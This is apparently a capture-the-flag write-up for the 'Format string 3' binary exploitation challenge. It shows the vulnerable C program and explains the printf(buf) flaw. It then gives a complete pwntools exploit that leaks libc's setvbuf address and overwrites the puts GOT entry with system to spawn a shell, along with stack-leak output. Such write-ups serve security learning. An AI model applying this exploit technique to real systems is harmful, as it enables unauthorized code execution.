# Write-up of the challenge "Format string 3"

This challenge is part of the "Binary exploitation" category and is in the medium category.

# Goal of the challenge

The objective of the challenge is just to input something and it echoes back what you wrote and then writes in the end /bin/sh. It also writes back the setvbuff from the binary.

## Program structure

```
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();	

	fgets(buf, 1024, stdin);	
	printf(buf);

	puts(normal_string);

	return 0;
}


```

## Problem

So when I saw that the program echoes back what I wrote before I even looked at the source code I knew it was **"format string attack"**. But I had no idea how to procced. What I knew however is that I needed so spawn the /bin/sh somehow.


## Security breach

The most important security vulnerability is **"printf(buf);"**. It printes the buff without any option like %s. We can abuse the **"format string vulnerability"** to leak data off the stack and even write data to the stack!

The other vulnerability is **"puts(normal_string);"** and **"char *normal_string = "/bin/sh";"**. If we can somehow change the **"puts"** to **"system"** then we can get a shell.

## Solution

So what I did first was bascially parse the leaked setvbuff and then subtract it with the setvbuff from the library that will give us the base. After that we can use ROP and get the system from the library. So before sending the fmstr payload we gotta check att which offset we write to the buffer and that would be when we see a value like **"0x7025702570257025"** which is at offset 38! So my idea is to change the **"puts"** to **"system"** to make us spawn **"system(normal_string)"**.


```

from pwn import *
import re

context.arch = 'amd64'
p = process('./format-string-3')
# p = remote('rhea.picoctf.net', 57387)
libc = ELF('libc.so.6')
elf = ELF('format-string-3')

p.recvuntil(b'libc: ')
setvbuff_leak = p.recvline()


base = int(setvbuff_leak, 16) - libc.sym['setvbuf']

print(setvbuff_leak)

libc.address = base
# elf.address = base

payload = fmtstr_payload(38, {elf.got.puts: libc.sym.system}, write_size="short")

p.sendline(payload)

p.interactive()


0x7fe296864963
0xfbad208b
0x7fff1aa35f80
0x1
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
0x7025702570257025
0x7025702570257025
0x7025702570257025
0x7025702570257025
```

After excuting the script we get the flag back!

If you liked this writeup you can star my repository.